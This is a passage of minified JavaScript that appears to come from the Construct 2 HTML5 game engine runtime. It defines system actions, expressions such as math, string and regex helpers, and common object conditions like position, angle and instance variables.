e;this.runtime.isloading||this.runtime.changelayout||(e=this.runtime.layouts_by_index.indexOf(this.runtime.running_layout),t&&0===e||!t&&e===this.runtime.layouts_by_index.length-1||(t=this.runtime.layouts_by_index[e+(t?-1:1)],this.runtime.changelayout=t))},o.prototype.CreateObject=function(t,e,i,s){if(e&&t){var n,r,o,a=this.runtime.createInstance(t,e,i,s);if(a){if(this.runtime.isInOnDestroy++,this.runtime.trigger(Object.getPrototypeOf(t.plugin).cnds.OnCreated,a),a.is_contained)for(n=0,r=a.siblings.length;n<r;n++)o=a.siblings[n],this.runtime.trigger(Object.getPrototypeOf(o.type.plugin).cnds.OnCreated,o);this.runtime.isInOnDestroy--;var h=t.getCurrentSol();if(h.select_all=!1,cr.clearArray(h.instances),(h.instances[0]=a).is_contained)for(n=0,r=a.siblings.length;n<r;n++)(h=(o=a.siblings[n]).type.getCurrentSol()).select_all=!1,cr.clearArray(h.instances),h.instances[0]=o}}},o.prototype.SetLayerVisible=function(t,e){t&&t.visible!==e&&(t.visible=e,this.runtime.redraw=!0)},o.prototype.SetLayerOpacity=function(t,e){t&&(e=cr.clamp(e/100,0,1),t.opacity!==e&&(t.opacity=e,this.runtime.redraw=!0))},o.prototype.SetLayerScaleRate=function(t,e){t&&t.zoomRate!==e&&(t.zoomRate=e,this.runtime.redraw=!0)},o.prototype.SetLayerForceOwnTexture=function(t,e){t&&(e=!!e,t.forceOwnTexture!==e&&(t.forceOwnTexture=e,this.runtime.redraw=!0))},o.prototype.SetLayoutScale=function(t){this.runtime.running_layout&&this.runtime.running_layout.scale!==t&&(this.runtime.running_layout.scale=t,this.runtime.running_layout.boundScrolling(),this.runtime.redraw=!0)},o.prototype.ScrollX=function(t){this.runtime.running_layout.scrollToX(t)},o.prototype.ScrollY=function(t){this.runtime.running_layout.scrollToY(t)},o.prototype.Scroll=function(t,e){this.runtime.running_layout.scrollToX(t),this.runtime.running_layout.scrollToY(e)},o.prototype.ScrollToObject=function(t){t=t.getFirstPicked();t&&(this.runtime.running_layout.scrollToX(t.x),this.runtime.running_layout.scrollToY(t.y))},o.prototype.SetVar=function(t,e){0===t.vartype?cr.is_number(e)?t.setValue(e):t.setValue(parseFloat(e)):1===t.vartype&&t.setValue(e.toString())},o.prototype.AddVar=function(t,e){0===t.vartype?cr.is_number(e)?t.setValue(t.getValue()+e):t.setValue(t.getValue()+parseFloat(e)):1===t.vartype&&t.setValue(t.getValue()+e.toString())},o.prototype.SubVar=function(t,e){0===t.vartype&&(cr.is_number(e)?t.setValue(t.getValue()-e):t.setValue(t.getValue()-parseFloat(e)))},o.prototype.SetGroupActive=function(t,e){var i=this.runtime.groups_by_name[t.toLowerCase()];if(i)switch(e){case 0:i.setGroupActive(!1);break;case 1:i.setGroupActive(!0);break;case 2:i.setGroupActive(!i.group_active)}},o.prototype.SetTimescale=function(t){t<0&&(t=0),this.runtime.timescale=t},o.prototype.SetObjectTimescale=function(t,e){var i=e;if(i<0&&(i=0),t)for(var s=t.getCurrentSol().getObjects(),n=0,r=s.length;n<r;n++)s[n].my_timescale=i},o.prototype.RestoreObjectTimescale=function(t){if(!t)return!1;for(var e=t.getCurrentSol().getObjects(),i=0,s=e.length;i<s;i++)e[i].my_timescale=-1};var c=[];function a(){var t=c.length?c.pop():{sols:{},solModifiers:[]};return t.deleteme=!1,t}var u=[];function h(){var t=u.length?u.pop():{insts:[]};return t.sa=!1,t}function g(t,e){var i=t[0]-e[0];return 0!=i?i:t[1]-e[1]}function f(t,e){return t[1]-e[1]}function p(){}o.prototype.Wait=function(t){if(!(t<0)){var e,i,s,n,r=this.runtime.getCurrentEventStack(),o=a();for(o.time=this.runtime.kahanTime.sum+t,o.signaltag="",o.signalled=!1,o.ev=r.current_event,o.actindex=r.actindex+1,e=0,i=this.runtime.types_by_index.length;e<i;e++)(s=(n=this.runtime.types_by_index[e]).getCurrentSol()).select_all&&-1===r.current_event.solModifiers.indexOf(n)||(o.solModifiers.push(n),(n=h()).sa=s.select_all,cr.shallowAssignArray(n.insts,s.instances),o.sols[e.toString()]=n);return this.waits.push(o),!0}},o.prototype.WaitForSignal=function(t){var e,i,s,n,r=this.runtime.getCurrentEventStack(),o=a();for(o.time=-1,o.signaltag=t.toLowerCase(),o.signalled=!1,o.ev=r.current_event,o.actindex=r.actindex+1,e=0,i=this.runtime.types_by_index.length;e<i;e++)(s=(n=this.runtime.types_by_index[e]).getCurrentSol()).select_all&&-1===r.current_event.solModifiers.indexOf(n)||(o.solModifiers.push(n),(n=h()).sa=s.select_all,cr.shallowAssignArray(n.insts,s.instances),o.sols[e.toString()]=n);return this.waits.push(o),!0},o.prototype.Signal=function(t){for(var e,i=t.toLowerCase(),s=0,n=this.waits.length;s<n;++s)-1===(e=this.waits[s]).time&&e.signaltag===i&&(e.signalled=!0)},o.prototype.SetLayerScale=function(t,e){t&&t.scale!==e&&(t.scale=e,this.runtime.redraw=!0)},o.prototype.ResetGlobals=function(){for(var t,e=0,i=this.runtime.all_global_vars.length;e<i;e++)(t=this.runtime.all_global_vars[e]).data=t.initial},o.prototype.SetLayoutAngle=function(t){t=cr.to_radians(t),t=cr.clamp_angle(t),this.runtime.running_layout&&this.runtime.running_layout.angle!==t&&(this.runtime.running_layout.angle=t,this.runtime.redraw=!0)},o.prototype.SetLayerAngle=function(t,e){t&&(e=cr.to_radians(e),e=cr.clamp_angle(e),t.angle!==e&&(t.angle=e,this.runtime.redraw=!0))},o.prototype.SetLayerParallax=function(t,e,i){if(t&&(t.parallaxX!==e/100||t.parallaxY!==i/100)){if(t.parallaxX=e/100,t.parallaxY=i/100,1!==t.parallaxX||1!==t.parallaxY)for(var s=t.instances,n=0,r=s.length;n<r;++n)s[n].type.any_instance_parallaxed=!0;this.runtime.redraw=!0}},o.prototype.SetLayerBackground=function(t,e){var i,s;t&&(i=cr.GetRValue(e),s=cr.GetGValue(e),e=cr.GetBValue(e),t.background_color[0]===i&&t.background_color[1]===s&&t.background_color[2]===e||(t.background_color[0]=i,t.background_color[1]=s,t.background_color[2]=e,this.runtime.redraw=!0))},o.prototype.SetLayerTransparent=function(t,e){t&&!!e!=!!t.transparent&&(t.transparent=!!e,this.runtime.redraw=!0)},o.prototype.SetLayerBlendMode=function(t,e){t&&t.blend_mode!==e&&(t.blend_mode=e,t.compositeOp=cr.effectToCompositeOp(t.blend_mode),this.runtime.gl&&cr.setGLBlend(t,t.blend_mode,this.runtime.gl),this.runtime.redraw=!0)},o.prototype.StopLoop=function(){this.runtime.loop_stack_index<0||(this.runtime.getCurrentLoop().stopped=!0)},o.prototype.GoToLayoutByName=function(t){if(!this.runtime.isloading&&!this.runtime.changelayout)for(var e in this.runtime.layouts)if(this.runtime.layouts.hasOwnProperty(e)&&cr.equals_nocase(e,t))return void(this.runtime.changelayout=this.runtime.layouts[e])},o.prototype.RestartLayout=function(t){var e,i,s;if(!this.runtime.isloading&&(!this.runtime.changelayout&&this.runtime.running_layout))for(this.runtime.changelayout=this.runtime.running_layout,e=0,i=this.runtime.allGroups.length;e<i;e++)(s=this.runtime.allGroups[e]).setGroupActive(s.initially_activated)},o.prototype.SnapshotCanvas=function(t,e){this.runtime.doCanvasSnapshot(0===t?"image/png":"image/jpeg",e/100)},o.prototype.SetCanvasSize=function(t,e){var i;t<=0||e<=0||(i=this.runtime.fullscreen_mode,(document.mozFullScreen||document.webkitIsFullScreen||!!document.msFullscreenElement||document.fullScreen||this.runtime.isNodeFullscreen)&&0<this.runtime.fullscreen_scaling&&(i=this.runtime.fullscreen_scaling),0===i?this.runtime.setSize(t,e,!0):(this.runtime.original_width=t,this.runtime.original_height=e,this.runtime.setSize(this.runtime.lastWindowWidth,this.runtime.lastWindowHeight,!0)))},o.prototype.SetLayoutEffectEnabled=function(t,e){this.runtime.running_layout&&this.runtime.glwrap&&((e=this.runtime.running_layout.getEffectByName(e))&&(t=1===t,e.active!=t&&(e.active=t,this.runtime.running_layout.updateActiveEffects(),this.runtime.redraw=!0)))},o.prototype.SetLayerEffectEnabled=function(t,e,i){t&&this.runtime.glwrap&&((i=t.getEffectByName(i))&&(e=1===e,i.active!=e&&(i.active=e,t.updateActiveEffects(),this.runtime.redraw=!0)))},o.prototype.SetLayoutEffectParam=function(t,e,i){var s;this.runtime.running_layout&&this.runtime.glwrap&&((s=this.runtime.running_layout.getEffectByName(t))&&(t=this.runtime.running_layout.effect_params[s.index],(e=Math.floor(e))<0||e>=t.length||(1===this.runtime.glwrap.getProgramParameterType(s.shaderindex,e)&&(i/=100),t[e]!==i&&(t[e]=i,s.active&&(this.runtime.redraw=!0)))))},o.prototype.SetLayerEffectParam=function(t,e,i,s){t&&this.runtime.glwrap&&((e=t.getEffectByName(e))&&(t=t.effect_params[e.index],(i=Math.floor(i))<0||i>=t.length||(1===this.runtime.glwrap.getProgramParameterType(e.shaderindex,i)&&(s/=100),t[i]!==s&&(t[i]=s,e.active&&(this.runtime.redraw=!0)))))},o.prototype.SaveState=function(t){this.runtime.saveToSlot=t},o.prototype.LoadState=function(t){this.runtime.loadFromSlot=t},o.prototype.LoadStateJSON=function(t){this.runtime.loadFromJson=t},o.prototype.SetHalfFramerateMode=function(t){this.runtime.halfFramerateMode=0!==t},o.prototype.SetFullscreenQuality=function(t){(document.mozFullScreen||document.webkitIsFullScreen||!!document.msFullscreenElement||document.fullScreen||this.isNodeFullscreen||0!==this.runtime.fullscreen_mode)&&(this.runtime.wantFullscreenScalingQuality=0!==t,this.runtime.setSize(this.runtime.lastWindowWidth,this.runtime.lastWindowHeight,!0))},o.prototype.ResetPersisted=function(){for(var t=0,e=this.runtime.layouts_by_index.length;t<e;++t)this.runtime.layouts_by_index[t].persist_data={},this.runtime.layouts_by_index[t].first_visit=!0},o.prototype.RecreateInitialObjects=function(t,e,i,s,n){t&&this.runtime.running_layout.recreateInitialObjects(t,e,i,s,n)},o.prototype.SetPixelRounding=function(t){this.runtime.pixel_rounding=0!==t,this.runtime.redraw=!0},o.prototype.SetMinimumFramerate=function(t){t<1&&(t=1),120<t&&(t=120),this.runtime.minimumFramerate=t},o.prototype.SortZOrderByInstVar=function(t,e){if(t){for(var i,s,n,r,o=t.getCurrentSol().getObjects(),a=[],h=[],c=this.runtime.running_layout,l=t.is_family,u=t.family_index,p=0,d=o.length;p<d;++p)(i=o[p]).layer&&(s=l?i.instance_vars[e+i.type.family_var_map[u]]:i.instance_vars[e],a.push([i.layer.index,i.get_zindex()]),h.push([i,s]));if(a.length)for(a.sort(g),h.sort(f),p=0,d=a.length;p<d;++p)i=h[p][0],n=c.layers[a[p][0]],r=a[p][1],n.instances[r]!==i&&((n.instances[r]=i).layer=n).setZIndicesStaleFrom(r)}},t.acts=new o,p.prototype.int=function(t,e){cr.is_string(e)?(t.set_int(parseInt(e,10)),isNaN(t.data)&&(t.data=0)):t.set_int(e)},p.prototype.float=function(t,e){cr.is_string(e)?(t.set_float(parseFloat(e)),isNaN(t.data)&&(t.data=0)):t.set_float(e)},p.prototype.str=function(t,e){cr.is_string(e)?t.set_string(e):t.set_string(e.toString())},p.prototype.len=function(t,e){t.set_int(e.length||0)},p.prototype.random=function(t,e,i){void 0===i?t.set_float(Math.random()*e):t.set_float(Math.random()*(i-e)+e)},p.prototype.sqrt=function(t,e){t.set_float(Math.sqrt(e))},p.prototype.abs=function(t,e){t.set_float(Math.abs(e))},p.prototype.round=function(t,e){t.set_int(Math.round(e))},p.prototype.floor=function(t,e){t.set_int(Math.floor(e))},p.prototype.ceil=function(t,e){t.set_int(Math.ceil(e))},p.prototype.sin=function(t,e){t.set_float(Math.sin(cr.to_radians(e)))},p.prototype.cos=function(t,e){t.set_float(Math.cos(cr.to_radians(e)))},p.prototype.tan=function(t,e){t.set_float(Math.tan(cr.to_radians(e)))},p.prototype.asin=function(t,e){t.set_float(cr.to_degrees(Math.asin(e)))},p.prototype.acos=function(t,e){t.set_float(cr.to_degrees(Math.acos(e)))},p.prototype.atan=function(t,e){t.set_float(cr.to_degrees(Math.atan(e)))},p.prototype.exp=function(t,e){t.set_float(Math.exp(e))},p.prototype.ln=function(t,e){t.set_float(Math.log(e))},p.prototype.log10=function(t,e){t.set_float(Math.log(e)/Math.LN10)},p.prototype.max=function(t){var e,i,s,n=arguments[1];for("number"!=typeof n&&(n=0),e=2,i=arguments.length;e<i;e++)"number"==typeof(s=arguments[e])&&n<s&&(n=s);t.set_float(n)},p.prototype.min=function(t){var e,i,s,n=arguments[1];for("number"!=typeof n&&(n=0),e=2,i=arguments.length;e<i;e++)"number"==typeof(s=arguments[e])&&s<n&&(n=s);t.set_float(n)},p.prototype.dt=function(t){t.set_float(this.runtime.dt)},p.prototype.timescale=function(t){t.set_float(this.runtime.timescale)},p.prototype.wallclocktime=function(t){t.set_float((Date.now()-this.runtime.start_time)/1e3)},p.prototype.time=function(t){t.set_float(this.runtime.kahanTime.sum)},p.prototype.tickcount=function(t){t.set_int(this.runtime.tickcount)},p.prototype.objectcount=function(t){t.set_int(this.runtime.objectcount)},p.prototype.fps=function(t){t.set_int(this.runtime.fps)},p.prototype.loopindex=function(t,e){var i,s;if(this.runtime.loop_stack.length)if(e){for(s=this.runtime.loop_stack_index;0<=s;--s)if((i=this.runtime.loop_stack[s]).name===e)return void t.set_int(i.index);t.set_int(0)}else i=this.runtime.getCurrentLoop(),t.set_int(i?i.index:-1);else t.set_int(0)},p.prototype.distance=function(t,e,i,s,n){t.set_float(cr.distanceTo(e,i,s,n))},p.prototype.angle=function(t,e,i,s,n){t.set_float(cr.to_degrees(cr.angleTo(e,i,s,n)))},p.prototype.scrollx=function(t){t.set_float(this.runtime.running_layout.scrollX)},p.prototype.scrolly=function(t){t.set_float(this.runtime.running_layout.scrollY)},p.prototype.newline=function(t){t.set_string("\n")},p.prototype.lerp=function(t,e,i,s){t.set_float(cr.lerp(e,i,s))},p.prototype.qarp=function(t,e,i,s,n){t.set_float(cr.qarp(e,i,s,n))},p.prototype.cubic=function(t,e,i,s,n,r){t.set_float(cr.cubic(e,i,s,n,r))},p.prototype.cosp=function(t,e,i,s){t.set_float(cr.cosp(e,i,s))},p.prototype.windowwidth=function(t){t.set_int(this.runtime.width)},p.prototype.windowheight=function(t){t.set_int(this.runtime.height)},p.prototype.uppercase=function(t,e){t.set_string(cr.is_string(e)?e.toUpperCase():"")},p.prototype.lowercase=function(t,e){t.set_string(cr.is_string(e)?e.toLowerCase():"")},p.prototype.clamp=function(t,e,i,s){e<i?t.set_float(i):s<e?t.set_float(s):t.set_float(e)},p.prototype.layerscale=function(t,e){e=this.runtime.getLayer(e);e?t.set_float(e.scale):t.set_float(0)},p.prototype.layeropacity=function(t,e){e=this.runtime.getLayer(e);e?t.set_float(100*e.opacity):t.set_float(0)},p.prototype.layerscalerate=function(t,e){e=this.runtime.getLayer(e);e?t.set_float(e.zoomRate):t.set_float(0)},p.prototype.layerparallaxx=function(t,e){e=this.runtime.getLayer(e);e?t.set_float(100*e.parallaxX):t.set_float(0)},p.prototype.layerparallaxy=function(t,e){e=this.runtime.getLayer(e);e?t.set_float(100*e.parallaxY):t.set_float(0)},p.prototype.layerindex=function(t,e){e=this.runtime.getLayer(e);e?t.set_int(e.index):t.set_int(-1)},p.prototype.layoutscale=function(t){this.runtime.running_layout?t.set_float(this.runtime.running_layout.scale):t.set_float(0)},p.prototype.layoutangle=function(t){t.set_float(cr.to_degrees(this.runtime.running_layout.angle))},p.prototype.layerangle=function(t,e){e=this.runtime.getLayer(e);e?t.set_float(cr.to_degrees(e.angle)):t.set_float(0)},p.prototype.layoutwidth=function(t){t.set_int(this.runtime.running_layout.width)},p.prototype.layoutheight=function(t){t.set_int(this.runtime.running_layout.height)},p.prototype.find=function(t,e,i){cr.is_string(e)&&cr.is_string(i)?t.set_int(e.search(new RegExp(cr.regexp_escape(i),"i"))):t.set_int(-1)},p.prototype.findcase=function(t,e,i){cr.is_string(e)&&cr.is_string(i)?t.set_int(e.search(new RegExp(cr.regexp_escape(i),""))):t.set_int(-1)},p.prototype.left=function(t,e,i){t.set_string(cr.is_string(e)?e.substr(0,i):"")},p.prototype.right=function(t,e,i){t.set_string(cr.is_string(e)?e.substr(e.length-i):"")},p.prototype.mid=function(t,e,i,s){t.set_string(cr.is_string(e)?e.substr(i,s):"")},p.prototype.tokenat=function(t,e,i,s){cr.is_string(e)&&cr.is_string(s)?(s=e.split(s),(i=cr.floor(i))<0||i>=s.length?t.set_string(""):t.set_string(s[i])):t.set_string("")},p.prototype.tokencount=function(t,e,i){cr.is_string(e)&&e.length?t.set_int(e.split(i).length):t.set_int(0)},p.prototype.replace=function(t,e,i,s){cr.is_string(e)&&cr.is_string(i)&&cr.is_string(s)?t.set_string(e.replace(new RegExp(cr.regexp_escape(i),"gi"),s)):t.set_string(cr.is_string(e)?e:"")},p.prototype.trim=function(t,e){t.set_string(cr.is_string(e)?e.trim():"")},p.prototype.pi=function(t){t.set_float(cr.PI)},p.prototype.layoutname=function(t){this.runtime.running_layout?t.set_string(this.runtime.running_layout.name):t.set_string("")},p.prototype.renderer=function(t){t.set_string(this.runtime.gl?"webgl":"canvas2d")},p.prototype.rendererdetail=function(t){t.set_string(this.runtime.glUnmaskedRenderer)},p.prototype.anglediff=function(t,e,i){t.set_float(cr.to_degrees(cr.angleDiff(cr.to_radians(e),cr.to_radians(i))))},p.prototype.choose=function(t){var e=cr.floor(Math.random()*(arguments.length-1));t.set_any(arguments[e+1])},p.prototype.rgb=function(t,e,i,s){t.set_int(cr.RGB(e,i,s))},p.prototype.projectversion=function(t){t.set_string(this.runtime.versionstr)},p.prototype.projectname=function(t){t.set_string(this.runtime.projectName)},p.prototype.anglelerp=function(t,e,i,s){e=cr.to_radians(e),i=cr.to_radians(i);var n=cr.angleDiff(e,i);cr.angleClockwise(i,e)?t.set_float(cr.to_clamped_degrees(e+n*s)):t.set_float(cr.to_clamped_degrees(e-n*s))},p.prototype.anglerotate=function(t,e,i,s){e=cr.to_radians(e),i=cr.to_radians(i),s=cr.to_radians(s),t.set_float(cr.to_clamped_degrees(cr.angleRotate(e,i,s)))},p.prototype.zeropad=function(t,e,i){var s=e<0?"-":"";e<0&&(e=-e);for(var n=i-e.toString().length,r=0;r<n;r++)s+="0";t.set_string(s+e.toString())},p.prototype.cpuutilisation=function(t){t.set_float(this.runtime.cpuutilisation/1e3)},p.prototype.viewportleft=function(t,e){e=this.runtime.getLayer(e);t.set_float(e?e.viewLeft:0)},p.prototype.viewporttop=function(t,e){e=this.runtime.getLayer(e);t.set_float(e?e.viewTop:0)},p.prototype.viewportright=function(t,e){e=this.runtime.getLayer(e);t.set_float(e?e.viewRight:0)},p.prototype.viewportbottom=function(t,e){e=this.runtime.getLayer(e);t.set_float(e?e.viewBottom:0)},p.prototype.loadingprogress=function(t){t.set_float(this.runtime.loadingprogress)},p.prototype.unlerp=function(t,e,i,s){t.set_float(cr.unlerp(e,i,s))},p.prototype.canvassnapshot=function(t){t.set_string(this.runtime.snapshotData)},p.prototype.urlencode=function(t,e){t.set_string(encodeURIComponent(e))},p.prototype.urldecode=function(t,e){t.set_string(decodeURIComponent(e))},p.prototype.canvastolayerx=function(t,e,i,s){e=this.runtime.getLayer(e);t.set_float(e?e.canvasToLayer(i,s,!0):0)},p.prototype.canvastolayery=function(t,e,i,s){e=this.runtime.getLayer(e);t.set_float(e?e.canvasToLayer(i,s,!1):0)},p.prototype.layertocanvasx=function(t,e,i,s){e=this.runtime.getLayer(e);t.set_float(e?e.layerToCanvas(i,s,!0):0)},p.prototype.layertocanvasy=function(t,e,i,s){e=this.runtime.getLayer(e);t.set_float(e?e.layerToCanvas(i,s,!1):0)},p.prototype.savestatejson=function(t){t.set_string(this.runtime.lastSaveJson)},p.prototype.imagememoryusage=function(t){this.runtime.glwrap?t.set_float(Math.round(100*this.runtime.glwrap.estimateVRAM()/1048576)/100):t.set_float(0)},p.prototype.regexsearch=function(t,e,i,s){s=r(i,s);t.set_int(e?e.search(s):-1)},p.prototype.regexreplace=function(t,e,i,s,n){s=r(i,s);t.set_string(e?e.replace(s,n):"")};var d=[],m="",b="",w="";function x(t,e,i){var s;t===m&&e===b&&i===w||(s=r(e,i),d=t.match(s),m=t,b=e,w=i)}p.prototype.regexmatchcount=function(t,e,i,s){r(i,s);x(e.toString(),i,s),t.set_int(d?d.length:0)},p.prototype.regexmatchat=function(t,e,i,s,n){n=Math.floor(n);r(i,s);x(e.toString(),i,s),!d||n<0||n>=d.length?t.set_string(""):t.set_string(d[n])},p.prototype.infinity=function(t){t.set_float(1/0)},p.prototype.setbit=function(t,e,i,s){e|=0,i|=0,s=0!==s?1:0,t.set_int(e&~(1<<i)|s<<i)},p.prototype.togglebit=function(t,e,i){e|=0,i|=0,t.set_int(e^1<<i)},p.prototype.getbit=function(t,e,i){e|=0,i|=0,t.set_int(e&1<<i?1:0)},p.prototype.originalwindowwidth=function(t){t.set_int(this.runtime.original_width)},p.prototype.originalwindowheight=function(t){t.set_int(this.runtime.original_height)},t.exps=new p,t.runWaits=function(){for(var t,e,i,s,n,r,o=this.runtime.getCurrentEventStack(),a=0,h=this.waits.length;a<h;a++){if(-1===(e=this.waits[a]).time){if(!e.signalled)continue}else if(e.time>this.runtime.kahanTime.sum)continue;for(i in o.current_event=e.ev,o.actindex=e.actindex,o.cndindex=0,e.sols)e.sols.hasOwnProperty(i)&&(s=this.runtime.types_by_index[parseInt(i,10)].getCurrentSol(),n=e.sols[i],s.select_all=n.sa,cr.shallowAssignArray(s.instances,n.insts),n=n,cr.clearArray(n.insts),u.push(n));e.ev.resume_actions_and_subevents(),this.runtime.clearSol(e.solModifiers),e.deleteme=!0}for(t=a=0,h=this.waits.length;a<h;a++)e=this.waits[a],(this.waits[t]=e).deleteme?(r=e,cr.wipe(r.sols),cr.clearArray(r.solModifiers),c.push(r)):t++;cr.truncateArray(this.waits,t)}}(),function(){cr.add_common_aces=function(t,e){var i=t[1],s=t[3],n=t[4],r=t[5],o=t[6],a=t[7],h=t[8];e.cnds||(e.cnds={}),e.acts||(e.acts={}),e.exps||(e.exps={});var c=e.cnds,t=e.acts,e=e.exps;s&&(c.CompareX=function(t,e){return cr.do_cmp(this.x,t,e)},c.CompareY=function(t,e){return cr.do_cmp(this.y,t,e)},c.IsOnScreen=function(){var t=this.layer;this.update_bbox();var e=this.bbox;return!(e.right<t.viewLeft||e.bottom<t.viewTop||e.left>t.viewRight||e.top>t.viewBottom)},c.IsOutsideLayout=function(){this.update_bbox();var t=this.bbox,e=this.runtime.running_layout;return t.right<0||t.bottom<0||t.left>e.width||t.top>e.height},c.PickDistance=function(t,e,i){var s=this.getCurrentSol(),n=s.getObjects();if(!n.length)return!1;for(var r,o=n[0],a=o,h=cr.distanceTo(o.x,o.y,e,i),c=1,l=n.length;c<l;c++)o=n[c],r=cr.distanceTo(o.x,o.y,e,i),(0===t&&r<h||1===t&&h<r)&&(h=r,a=o);return s.pick_one(a),!0},t.SetX=function(t){this.x!==t&&(this.x=t,this.set_bbox_changed())},t.SetY=function(t){this.y!==t&&(this.y=t,this.set_bbox_changed())},t.SetPos=function(t,e){this.x===t&&this.y===e||(this.x=t,this.y=e,this.set_bbox_changed())},t.SetPosToObject=function(t,e){var i,t=t.getPairedInstance(this);t&&(t=t.getImagePoint?(i=t.getImagePoint(e,!0),t.getImagePoint(e,!1)):(i=t.x,t.y),this.x===i&&this.y===t||(this.x=i,this.y=t,this.set_bbox_changed()))},t.MoveForward=function(t){0!==t&&(this.x+=Math.cos(this.angle)*t,this.y+=Math.sin(this.angle)*t,this.set_bbox_changed())},t.MoveAtAngle=function(t,e){0!==e&&(this.x+=Math.cos(cr.to_radians(t))*e,this.y+=Math.sin(cr.to_radians(t))*e,this.set_bbox_changed())},e.X=function(t){t.set_float(this.x)},e.Y=function(t){t.set_float(this.y)},e.dt=function(t){t.set_float(this.runtime.getDt(this))}),n&&(c.CompareWidth=function(t,e){return cr.do_cmp(this.width,t,e)},c.CompareHeight=function(t,e){return cr.do_cmp(this.height,t,e)},t.SetWidth=function(t){this.width!==t&&(this.width=t,this.set_bbox_changed())},t.SetHeight=function(t){this.height!==t&&(this.height=t,this.set_bbox_changed())},t.SetSize=function(t,e){this.width===t&&this.height===e||(this.width=t,this.height=e,this.set_bbox_changed())},e.Width=function(t){t.set_float(this.width)},e.Height=function(t){t.set_float(this.height)},e.BBoxLeft=function(t){this.update_bbox(),t.set_float(this.bbox.left)},e.BBoxTop=function(t){this.update_bbox(),t.set_float(this.bbox.top)},e.BBoxRight=function(t){this.update_bbox(),t.set_float(this.bbox.right)},e.BBoxBottom=function(t){this.update_bbox(),t.set_float(this.bbox.bottom)}),r&&(c.AngleWithin=function(t,e){return cr.angleDiff(this.angle,cr.to_radians(e))<=cr.to_radians(t)},c.IsClockwiseFrom=function(t){return cr.angleClockwise(this.angle,cr.to_radians(t))},c.IsBetweenAngles=function(t,e){var i=cr.to_clamped_radians(t),t=cr.to_clamped_radians(e),e=cr.clamp_angle(this.angle);return!cr.angleClockwise(t,i)?!(!cr.angleClockwise(e,i)&&cr.angleClockwise(e,t)):cr.angleClockwise(e,i)&&!cr.angleClockwise(e,t)},t.SetAngle=function(t){t=cr.to_radians(cr.clamp_angle_degrees(t));isNaN(t)||this.angle!==t&&(this.angle=t,this.set_bbox_changed())},t.RotateClockwise=function(t){0===t||isNaN(t)||(this.angle+=cr.to_radians(t),this.angle=cr.clamp_angle(this.angle),this.set_bbox_changed())},t.RotateCounterclockwise=function(t){0===t||isNaN(t)||(this.angle-=cr.to_radians(t),this.angle=cr.clamp_angle(this.angle),this.set_bbox_changed())},t.RotateTowardAngle=function(t,e){t=cr.angleRotate(this.angle,cr.to_radians(e),cr.to_radians(t));isNaN(t)||this.angle!==t&&(this.angle=t,this.set_bbox_changed())},t.RotateTowardPosition=function(t,e,i){e-=this.x,i-=this.y,e=Math.atan2(i,e),t=cr.angleRotate(this.angle,e,cr.to_radians(t));isNaN(t)||this.angle!==t&&(this.angle=t,this.set_bbox_changed())},t.SetTowardPosition=function(t,e){t-=this.x,e-=this.y,t=Math.atan2(e,t);isNaN(t)||this.angle!==t&&(this.angle=t,this.set_bbox_changed())},e.Angle=function(t){t.set_float(cr.to_clamped_degrees(this.angle))}),i||(c.CompareInstanceVar=function(t,e,i){return cr.do_cmp(this.instance_vars[t],e,i)},c.IsBoolInstanceVarSet=function(t){return this.instance_vars[t]},c.PickInstVarHiLow=function(t,e){var i=this.getCurrentSol(),s=i.getObjects();if(!s.length)return!1;for(var n,r=s[0],o=r,a=r.instance_vars[e],h=1,c=s.length;h<c;h++)n=(r=s[h]).instance_vars[e],(0===t&&n<a||1===t&&a<n)&&(a=n,o=r);return i.pick_one(o),!0},c.PickByUID=function(t){var e,i,s,n,r,o,a;if(this.runtime.getCurrentCondition().inverted){if((a=this.getCurrentSol()).select_all){for(a.select_all=!1,cr.clearArray(a.instances),cr.clearArray(a.else_instances),e=0,i=(o=this.instances).length;e<i;e++)((n=o[e]).uid===t?a.else_instances:a.instances).push(n);return this.applySolToContainer(),!!a.instances.length}for(s=e=0,i=a.instances.length;e<i;e++)n=a.instances[e],(a.instances[s]=n).uid===t?a.else_instances.push(n):s++;return cr.truncateArray(a.instances,s),this.applySolToContainer(),!!a.instances.length}if(!(n=this.runtime.getObjectByUID(t)))return!1;if(!(a=this.getCurrentSol()).select_all&&-1===a.instances.indexOf(n))return!1;if(this.is_family){for(e=0,i=(r=n.type.families).length;e<i;e++)if(r[e]===this)return a.pick_one(n),this.applySolToContainer(),!0}else if(n.type===this)return a.pick_one(n),this.applySolToContainer(),!0;return!1},c.OnCreated=function(){return!0},c.OnDestroyed=function(){return!0},t.SetInstanceVar=function(t,e){var i=this.instance_vars;cr.is_number(i[t])?cr.is_number(e)?i[t]=e:i[t]=parseFloat(e):cr.is_string(i[t])&&(cr.is_string(e)?i[t]=e:i[t]=e.toString())},t.AddInstanceVar=function(t,e){var i=this.instance_vars;cr.is_number(i[t])?cr.is_number(e)?i[t]+=e:i[t]+=parseFloat(e):cr.is_string(i[t])&&(cr.is_string(e)?i[t]+=e:i[t]+=e.toString())},t.SubInstanceVar=function(t,e){var i=this.instance_vars;cr.is_number(i[t])&&(cr.is_number(e)?i[t]-=e:i[t]-=parseFloat(e))},t.SetBoolInstanceVar=function(t,e){this.instance_vars[t]=e?1:0},t.ToggleBoolInstanceVar=function(t){this.instance_vars[t]=1-this.instance_vars[t]},t.Destroy=function(){this.runtime.DestroyInstance(this)},t.LoadFromJsonString||(t.LoadFromJsonString=function(t){var e,i,s,n;try{e=JSON.parse(t)}catch(t){return}if(this.runtime.loadInstanceFromJSON(this,e,!0),this.afterLoad&&this.afterLoad(),this.behavior_insts)for(i=0,s=this.behavior_insts.length;i<s;++i)(n=this.behavior_insts[i]).afterLoad&&n.afterLoad()}),e.Count=function(t){for(var e,i=t.object_class.instances.length,s=0,n=this.runtime.createRow.length;s<n;s++)e=this.runtime.createRow[s],t.object_class.is_family?0<=e.type.families.indexOf(t.object_class)&&i++:e.type===t.object_class&&i++;t.set_int(i)},e.PickedCount=function(t){t.set_int(t.object_class.getCurrentSol().getObjects().length)},e.UID=function(t){t.set_int(this.uid)},e.IID=function(t){t.set_int(this.get_iid())},e.AsJSON||(e.AsJSON=function(t){t.set_string(JSON.stringify(this.runtime.saveInstanceToJSON(this,!0)))})),o&&(c.IsVisible=function(){return this.visible},t.SetVisible=function(t){!t!=!this.visible&&(this.visible=!!t,this.runtime.redraw=!0)},c.CompareOpacity=function(t,e){return 